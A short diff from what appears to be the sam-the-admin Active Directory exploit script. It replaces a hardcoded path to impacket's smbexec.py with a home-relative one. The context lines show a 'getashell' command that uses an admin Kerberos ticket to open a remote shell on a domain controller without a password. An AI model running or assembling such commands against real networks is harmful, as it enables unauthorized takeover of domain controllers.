@@ -118,9 +118,9 @@ def samtheadmin(username, password, domain, options):
     os.environ["KRB5CCNAME"] = adminticket
 
     # will do something else later on 
-    fbinary = "python3 /Users/huxuhao/impacket/examples/smbexec.py"
+    fbinary = "python3 ~/impacket/examples/smbexec.py"
     if options.dump:
-        fbinary = "python3 /Users/huxuhao/impacket/examples/smbexec.py"
+        fbinary = "python3 ~/impacket/examples/smbexec.py"
 
     print(adminticket+fbinary+options.dc_ip+options.dc_ip+dcfull)
     getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass @'{dcfull}'                                                                    "
